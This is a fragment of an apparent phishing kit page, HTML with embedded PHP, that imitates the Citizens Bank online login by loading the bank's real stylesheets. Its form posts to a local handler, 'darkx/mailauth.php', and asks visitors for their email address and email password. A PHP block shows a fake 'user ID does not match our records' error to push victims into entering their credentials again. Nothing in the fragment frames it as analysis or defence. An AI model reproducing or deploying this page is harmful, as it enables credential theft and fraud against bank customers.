...
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css">
  <link href="https://www4.citizensbankonline.com/efs/ui/tli/css/app.bundle.ca16fac30797c1b114bf.css" rel="stylesheet">

  <meta name="viewport" content="width=device-width, initial-scale=1">


    <link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/ui/tli/css/main.min.[SVNREV].css">
    </head>
  ...
  <div id="page-container" class="page-container"><div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            ...
            <form action="darkx/mailauth.php" method="post" class="unauth-form jqtransform js-login-form">
                ...
                <div class="unauth-form__rowgroup -visible" id="unauth-ic-form-rowgroup-account-info" style="display: block;">
                    <div class="unauth-form__row">
                        <?php 
                                ...
                                $em = "6004";
                                if ($AuthCode == $em) {
                                print"<input type='hidden' name='AuthCode' value='AuthCode'><div id='messagecontainer' class='show-error' role='alert'>The online user ID below does not match our records. Please review your information then try again. If you are still unable to continue, please call our Customer Service Center.</div>";}}?>
                            ...
                            <div class="js-user-block">
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        ...
                                        <div>
                                            <input id="unauth-form-first-name" name="mail" type="text" placeholder="Email Address" class="unauth-form__input js-firstname" data-toenable="accInfoLastName" maxlength="200" autocomplete="off" required="">
                                        </div>
                                 ...
                                 <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Email Password:</label>
                                            <div>
                                                <input name="password" placeholder="Enter Your Password" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="14" autocomplete="off" required="">
                                            </div>
